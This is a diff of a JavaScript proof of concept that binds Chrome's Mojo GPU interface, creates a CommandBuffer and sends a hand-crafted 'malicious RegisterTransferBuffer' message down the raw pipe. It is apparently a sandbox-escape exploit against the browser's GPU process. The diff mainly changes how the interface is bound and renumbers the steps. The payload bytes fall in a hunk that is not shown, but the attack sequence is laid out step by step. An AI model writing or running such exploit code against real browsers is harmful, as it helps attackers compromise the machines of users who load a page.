@@ -13,26 +13,29 @@
             console.log(msg);
         };
         try {
-            // 1. Bind to the GPU interface (returns a raw Mojo handle)
+            // 1. Get the renderer's interface provider (a Mojo handle)
+            const provider = Mojo.getInterfaceProvider();
+
+            // 2. Bind to the GPU interface using that provider
             let gpuHandle, gpu;
             try {
-                gpuHandle = Mojo.bindInterface('viz.mojom.Gpu', 'browser');
+                gpuHandle = Mojo.bindInterface('viz.mojom.Gpu', provider);
                 gpu = new viz.mojom.GpuPtr(gpuHandle);
                 status('Bound to viz.mojom.Gpu');
             } catch (e) {
-                gpuHandle = Mojo.bindInterface('gpu.mojom.GpuChannel', 'browser');
+                gpuHandle = Mojo.bindInterface('gpu.mojom.GpuChannel', provider);
                 gpu = new gpu.mojom.GpuChannelPtr(gpuHandle);
                 status('Bound to gpu.mojom.GpuChannel');
             }
 
-            // 2. Create a message pipe for the CommandBuffer and its client
+            // 3. Create a message pipe for the CommandBuffer and its client
             const {handle0: cmdBufferHandle, handle1: cmdBufferServer} = Mojo.createMessagePipe();
             const {handle0: clientHandle, handle1: clientServer} = Mojo.createMessagePipe();
 
-            // 3. Create a small shared buffer for the shared state (size doesn't matter)
+            // 4. Create a small shared buffer for the shared state (size doesn't matter)
             const sharedState = Mojo.createSharedBuffer(4096);
 
-            // 4. Build the CreateCommandBufferParams
+            // 5. Build the CreateCommandBufferParams
             const createParams = {
                 params: {
                     // CommandBufferParams – minimal valid values
@@ -45,15 +48,15 @@
                 client: clientServer                // server end of CommandBufferClient pipe
             };
 
-            // 5. Request a new CommandBuffer (async)
+            // 6. Request a new CommandBuffer (async)
             await gpu.createCommandBuffer(createParams);
             status('CommandBuffer created');
 
-            // 6. Wrap the client handle in the generated remote
+            // 7. Wrap the client handle in the generated remote
             const cmdBuffer = new gpu.mojom.CommandBufferPtr(cmdBufferHandle);
             const pipeHandle = cmdBuffer.ptr.getHandle();
 
-            // 7. Craft the malicious RegisterTransferBuffer message (ordinal 4)
+            // 8. Craft the malicious RegisterTransferBuffer message (ordinal 4)
             const payload = new ArrayBuffer(256);
             const view = new DataView(payload);
 
@@ -78,7 +81,7 @@
             const sharedBuffer = Mojo.createSharedBuffer(4096);
             const handles = [sharedBuffer.handle];
 
-            // 8. Send the raw message directly on the CommandBuffer pipe
+            // 9. Send the raw message directly on the CommandBuffer pipe
             pipeHandle.writeMessage(payload, handles);
             status('Malicious RegisterTransferBuffer sent!');
 
